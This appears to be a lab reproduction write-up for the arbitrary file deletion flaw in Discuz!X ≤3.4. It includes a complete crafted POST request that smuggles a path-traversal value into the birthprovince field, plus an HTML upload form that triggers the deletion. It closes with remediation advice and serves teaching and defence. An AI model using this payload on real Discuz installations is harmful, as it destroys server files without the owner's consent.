# Discuz!X ≤3.4 Arbitrary File Deletion Vulnerability

> [中文文档](README.md)

| Attribute | Details |
|-----------|---------|
| **Vulnerability Name** | Discuz!X ≤3.4 Arbitrary File Deletion |
| **Affected Component** | Discuz! X ≤3.4 |
| **Vulnerability Type** | Arbitrary File Deletion |
| **Severity** | 🟠 Medium |
| **Default Port** | 8080 |

## Vulnerability Description

There is an arbitrary file deletion vulnerability in Discuz!X ≤3.4 versions. Attackers can write a file path to the database through a specially crafted personal profile modification request, and then trigger the file deletion operation during avatar upload to delete arbitrary files on the server.

## Vulnerability Reproduction

### Environment Information

- Target IP: 192.168.2.47
- Web Port: 8080

### Operation Steps

**1. Install Discuz**

During installation, only modify the database address to `db`, and keep everything else as `default`:

![Installation Page](https://static.nextcyber.cn/attachments/images/course/task/bc4c406ed04c4ee4826f45b2171a453c.png)

**2. Verify robots.txt Exists**

Access `http://192.168.2.47/robots.txt` to confirm it exists:

![robots.txt exists](https://static.nextcyber.cn/attachments/images/course/task/f07c270349d844f9b6316db5a7b0963b.png)

**3. Obtain formhash**

After registering a user, find your `formhash` on the personal settings page:

![Get formhash](https://static.nextcyber.cn/attachments/images/course/task/530f33d14e4a459985d657dd9ee7f6b1.png)

**4. Send Malicious Request**

Send the following data packet with your `Cookie` and `formhash`:

```
POST /home.php?mod=spacecp&ac=profile&op=base HTTP/1.1
Host: localhost
Content-Length: 367
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryPFvXyxL45f34L12s
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.79 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,en;q=0.6
Cookie: [your cookie]
Connection: close

------WebKitFormBoundaryPFvXyxL45f34L12s
Content-Disposition: form-data; name="formhash"

[your formhash]
------WebKitFormBoundaryPFvXyxL45f34L12s
Content-Disposition: form-data; name="birthprovince"

../../../robots.txt
------WebKitFormBoundaryPFvXyxL45f34L12s
Content-Disposition: form-data; name="profilesubmit"

1
------WebKitFormBoundaryPFvXyxL45f34L12s--
```

![Send Request](https://static.nextcyber.cn/attachments/images/course/task/d0f5dc6c25684d1eb2e09bc1e9a0fb24.png)

After successful submission, the `birthplace` field on the user profile modification page will display as shown below:

![Dirty Data](https://static.nextcyber.cn/attachments/images/course/task/6f71e1428c274bf3b3b098b3901a071c.png)

This indicates that our `dirty data` has entered the database.

**5. Create Upload Page**

Then, create a new `upload.html` with the following code, replacing `your-ip` with the Discuz domain and `form-hash` with your formhash:

```html
<body>
    <form action="http://[your-ip]/home.php?mod=spacecp&ac=profile&op=base&profilesubmit=1&formhash=[form-hash]" method="post" enctype="multipart/form-data">
        <input type="file" name="birthprovince" />
        <input type="submit" value="upload" />
    </form>
</body>
```

Open this page in a browser and upload a normal image. At this point, the dirty data should have been extracted, and the vulnerability exploitation is complete.

**6. Verify File Deletion**

Access `http://192.168.2.47/robots.txt` again, and you will find the file has been successfully deleted.

## Vulnerability Principle

When Discuz!X processes user profile data, it directly stores the user-input `birthprovince` field into the database. When a user uploads an avatar, the program reads this field value from the database and processes it as a file path. Due to insufficient path traversal validation, attackers can delete arbitrary files on the server through path traversal sequences like `../../../robots.txt`.

## Remediation Recommendations

1. Upgrade to the latest version of Discuz!X
2. Strictly validate and filter user input paths
3. Restrict the range of files that can be deleted
4. Use whitelist mechanisms to restrict file operations
